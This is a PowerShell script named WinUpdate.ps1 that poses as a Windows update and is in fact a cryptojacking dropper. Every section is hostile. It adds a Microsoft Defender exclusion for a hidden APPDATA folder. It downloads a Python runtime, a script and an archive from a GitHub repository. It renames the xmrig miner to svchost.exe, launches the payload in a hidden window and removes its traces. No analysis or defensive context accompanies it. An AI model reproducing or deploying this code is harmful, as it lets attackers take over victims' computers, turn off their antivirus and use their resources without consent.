# --- THE FINAL MASTER (WinUpdate.ps1) ---
# Forced TLS 1.2 and Stealth Mode
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'

$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration
$C_URL = "https://github.com/itzcurled/footbalhunt/raw/main/WinServices.py"
$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdataData.zip"

# 2. Hard Reset & Blinding the Gatekeeper (Admin Required)
if (Test-Path $Path) { 
    # Kill any existing engine processes before cleanup
    Stop-Process -Name "$ID" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null

# Create the Shadow Zone - Defender cannot touch anything inside this path
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 3. Shadow Engine Setup (No-Python Fix)
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# 4. Deployment
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"

if (Test-Path "$Path\UpdataData.zip") {
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    
    # Locate xmrig.exe and transform it into the shadow service
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { 
        Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force 
    }
}

# 5. Activation
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}

# 6. Final Cleanup
Remove-Item -Path "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
# Clean up temp folders but keep our core engine and python environment
Get-ChildItem -Path $Path -Directory | Where-Object { $_.Name -ne "python" } | Remove-Item -Recurse -Force
